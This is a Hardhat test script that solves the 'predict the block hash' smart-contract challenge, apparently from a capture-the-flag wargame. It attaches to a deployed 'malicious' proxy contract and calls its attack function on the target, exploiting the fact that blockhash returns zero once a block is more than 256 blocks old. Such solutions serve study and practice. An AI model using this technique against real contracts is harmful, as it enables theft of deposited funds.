import { ethers } from "hardhat";
import { Signer } from "ethers";
import { expect } from "chai";

// 0x23a6A169e879809457D8A5857Fe61D004aff6717

function delay(ms: number) {
    return new Promise( resolve => setTimeout(resolve, ms) );
}

describe("predicttheblockhash", function() {
    it("Should solve the predict the block hash challenge", async function() {
        this.timeout(0);

        let abi = [
            // "function lockInGuess(uint8 n) public payable",
            "function isComplete() public view returns (bool)"
        ];

        const targetAddr = "0x31a5369793F4c01496d00f45F7EBc9704Ba3cd4D";

        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));

        // connect to original contract
        let contract = new ethers.Contract(targetAddr, abi, ethers.getDefaultProvider());
        let target = contract.connect(eoa);
        
        // deploy proxy contract
        const factory = await ethers.getContractFactory("PredictTheBlockHashProxy");
        /*
        const proxyCont = await factory.deploy();
        console.log("Malicious contract deployed at: " + proxyCont.address);
        */
        const proxyCont = await factory.attach("0x23a6A169e879809457D8A5857Fe61D004aff6717");

        /*
        // lock the guess
        let payval = { value: ethers.utils.parseEther('1') };
        let tx = await proxyCont.guess(targetAddr, payval);
        expect(tx.hash).to.not.be.undefined;
        console.log(tx);
        */

        // wait for 256 block
        let provider = ethers.getDefaultProvider();
        let settleNum = await provider.getBlockNumber();
        let currentBlock: number;
        /*
        do {
            await delay(60000);
            currentBlock = await provider.getBlockNumber();
            console.log("Current block num:" + currentBlock);
                        
        } while (currentBlock - settleNum < 257) 
        */
        let tx = await proxyCont.attack(targetAddr, 12101020);
        expect(tx.hash).to.not.be.undefined;
        console.log(tx);
    });        
});